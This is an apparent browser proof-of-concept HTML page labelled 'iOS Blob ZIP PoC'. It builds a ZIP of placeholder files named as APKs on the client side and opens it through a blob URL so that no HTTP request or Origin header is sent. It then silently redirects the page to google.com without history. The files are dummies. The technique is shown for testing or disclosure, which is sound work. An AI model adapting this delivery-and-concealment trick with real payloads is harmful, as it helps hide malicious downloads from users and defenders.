```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>iOS Blob ZIP PoC (Enhanced)</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>

<style>
  body {
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:sans-serif;
    background:#f5f5f5;
    margin:0;
    text-align:center;
  }

  button {
    padding:16px 26px;
    font-size:18px;
  }

  #log {
    margin-top:20px;
    font-size:14px;
    color:#333;
    max-width:300px;
    word-wrap:break-word;
  }
</style>
</head>
<body>

<div>
  <button onclick="runPoC()">Run PoC</button>
  <div id="log"></div>
</div>

<script>
// ===== NETWORK DETECTION =====
(function () {
  const log = msg => {
    document.getElementById("log").innerHTML += "<br>" + msg;
  };

  const origFetch = window.fetch;
  window.fetch = function(...args) {
    log("⚠️ fetch called → network request detected");
    return origFetch.apply(this, args);
  };

  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(...args) {
    log("⚠️ XHR called → network request detected");
    return origOpen.apply(this, args);
  };

  window._log = log;
})();

async function runPoC() {
  try {
    _log("▶ Generating ZIP in client...");

    const zip = new JSZip();

    for (let i = 1; i <= 4; i++) {
      zip.file(`app${i}.apk`, "Fake APK File " + i);
    }

    const blob = await zip.generateAsync({ type: "blob" });
    const blobUrl = URL.createObjectURL(blob);

    _log("✔ ZIP generated (client-side)");
    _log("✔ Blob URL created");
    _log("✔ No HTTP request triggered → no Origin header");

    // ===== OPEN FILE =====
    const newTab = window.open(blobUrl, "_blank");

    if (!newTab) {
      _log("❌ Popup blocked. Tap again.");
      return;
    }

    _log("✔ File opened in new tab");

    // ===== REDIRECT =====
    setTimeout(() => {
      _log("▶ Redirecting (no history)...");

      window.location.replace("https://www.google.com");
    }, 1500);

  } catch (e) {
    console.error(e);
    _log("❌ Error occurred");
  }
}
</script>

</body>
</html>
```
